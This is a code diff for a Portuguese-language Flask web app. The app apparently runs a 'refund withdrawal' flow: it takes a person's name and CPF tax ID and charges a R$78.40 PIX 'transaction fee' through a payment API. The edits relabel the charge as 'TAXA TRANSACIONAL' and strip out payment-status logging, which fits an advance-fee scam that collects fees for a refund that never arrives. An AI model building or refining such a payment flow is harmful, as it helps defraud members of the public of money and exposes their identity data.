@@ -390,7 +390,7 @@ def processar_retirada():
     user_data = session.get('dados_usuario')
     if not user_data:
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
-        return redirect(url_for('index'))
+        return redirect(url_for('retirada_restituicao'))
 
     confirma_dados = request.form.get('confirma_dados')
     if not confirma_dados:
@@ -530,7 +530,7 @@ class For4PaymentsAPI:
                 "paymentMethod": "PIX",
                 "amount": amount_in_cents,
                 "items": [{
-                    "title": "FINALIZAR INSCRICAO",
+                    "title": "TAXA TRANSACIONAL",
                     "quantity": 1,
                     "unitPrice": amount_in_cents,
                     "tangible": False
@@ -571,9 +571,6 @@ class For4PaymentsAPI:
                 timeout=30
             )
 
-            logger.info(f"Payment status check response: {response.status_code}")
-            logger.debug(f"Payment status response body: {response.text}")
-
             if response.status_code == 200:
                 payment_data = response.json()
                 # Map For4Payments status to our application status
@@ -592,19 +589,14 @@ class For4PaymentsAPI:
                 current_status = payment_data.get('status', 'PENDING')
                 mapped_status = status_mapping.get(current_status, 'pending')
 
-                logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")
-
                 return {
                     'status': mapped_status,
                     'pix_qr_code': payment_data.get('pixQrCode'),
                     'pix_code': payment_data.get('pixCode')
                 }
             elif response.status_code == 404:
-                logger.warning(f"Payment {payment_id} not found")
                 return {'status': 'pending'}
             else:
-                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
-                logger.error(error_message)
                 return {'status': 'pending'}
 
         except Exception as e:
@@ -627,10 +619,10 @@ def pagamento():
         payment_api = create_payment_api()
         payment_data = {
             'name': user_data['nome_real'], 
-            'email': user_data.get('email', generate_random_email()), 
+            'email': user_data.get('email', ''), 
             'cpf': user_data['cpf'],
-            'phone': user_data.get('phone', generate_random_phone()), 
-            'amount': 78.40  
+            'phone': user_data.get('telefone', ''), 
+            'amount': 78.40  # Valor da tarifa transacional
         }
 
         pix_data = payment_api.create_pix_payment(payment_data)
@@ -769,9 +761,9 @@ def obrigado():
 
 @app.route('/categoria/<tipo>')
 def categoria(tipo):
-    user_data = session.get('dados_usuario') 
+    user_data = session.get('dados_usuario')
     if not user_data:
-        flash('Sessão expirada. Por favor, faça a consulta novamente.')
+        flash('Sessãoexpirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
     return render_template(f'categoria_{tipo}.html', 
                          current_year=datetime.now().year,
